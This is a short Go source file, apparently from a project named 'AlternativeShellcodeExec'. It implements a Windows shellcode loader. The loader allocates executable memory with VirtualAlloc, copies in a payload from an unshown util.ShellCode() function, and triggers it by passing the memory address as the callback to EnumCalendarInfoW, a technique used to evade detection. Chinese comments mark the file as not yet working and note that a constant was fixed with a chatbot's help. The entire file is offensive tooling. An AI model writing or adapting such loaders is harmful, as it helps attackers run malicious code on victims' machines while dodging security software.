package main

//todo 无法运行
import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	LOCALE_USER_DEFAULT    = 0x0400
	//这个它写错了。new bing给它纠正了
	//问 ENUM_ALL_CALENDARS 十六进制的值
	//ENUM_ALL_CALENDARS 常量是 Windows API 中的一个常量，它表示枚举所有与指定区域设置相关联的日历。这个常量的十六进制值是 0xffffffff。
	ENUM_ALL_CALENDARS = 0xffffffff
	CAL_SMONTHNAME1    = 0x00000038
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory    = kernel32.NewProc("RtlMoveMemory")
	EnumCalendarInfo = kernel32.NewProc("EnumCalendarInfoW")
)

func Run(op []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))

	EnumCalendarInfo.Call(addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1)
}

func main() {
	Run(util.ShellCode())
}
